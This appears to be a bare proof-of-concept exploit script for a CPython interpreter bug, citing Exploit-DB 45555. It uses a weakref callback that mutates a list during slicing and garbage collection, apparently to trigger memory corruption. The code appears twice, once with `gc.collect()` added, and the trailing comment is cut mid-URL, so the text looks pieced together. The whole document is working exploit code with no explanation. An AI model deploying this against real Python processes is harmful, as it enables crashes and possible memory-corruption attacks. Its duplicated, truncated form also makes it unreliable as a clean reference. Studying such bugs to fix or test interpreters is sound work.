import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
del a
while lst:keepali0e.append(lst[:])

#https://www.exploit-db.com/exploits/45555/
#https://github.com/python/cpython/blob/master/Modules/gcmodule.c
#https://github.com/python/cpython/blob/master/Objects/listobject.c
#https://github.com/python/cpython/blob/master/Objects/listobject.c#L1819
import gc
import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
del a
while lst:keepali0e.append(lst[:])
gc.collect()

#https://www.exploit-db.com/exploits/45555/
#https://github.com/python/cpython/blob/master/Modules/gcmodule.c
#https://github.com/python/cpython/blob
